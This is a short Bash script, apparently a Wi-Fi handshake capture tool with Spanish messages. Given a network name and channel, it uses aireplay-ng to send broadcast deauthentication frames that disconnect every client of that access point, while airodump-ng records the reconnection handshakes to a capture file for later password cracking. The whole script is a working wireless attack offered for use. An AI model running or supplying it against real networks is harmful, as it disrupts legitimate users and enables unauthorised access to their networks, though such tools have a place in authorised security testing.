#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"

trap ctrl_c INT
function ctrl_c(){
  kill -9 $aireplay_ng_xterm_PID 2>/dev/null
  echo -e "[${blueColour}*${endColour}] Saliendo"
  mv *.cap "$apName".cap
  rm *.csv *.netxml
	exit 0
}

if [ "$(id -u)" == "0" ]; then
	declare -i parameter_counter=0;	while getopts ":a:c:" arg; do
		case $arg in
			a) apName=$OPTARG; let parameter_counter+=1;;
      c) apChanel=$OPTARG; let parameter_counter+=1;;
		esac
	done

  if [ $parameter_counter -ne 2 ]; then
		echo -e "[${redColour}*${endColour} Use: ./capture.sh -a [Network name] -c [Network chanel]"
	else
    interface=$(iw dev | awk '$1=="Interface"{print $2}')
    xterm -hold -e "aireplay-ng -0 10 -c FF:FF:FF:FF:FF:FF -e '$apName' $interface && echo 'Done!'" &

    aireplay_ng_xterm_PID=$!
    airodump-ng -w Captura -c $apChanel --essid "$apName" $interface
	fi

else
  echo -e "[${yellowColour}*${endColour}] Run as root"
fi
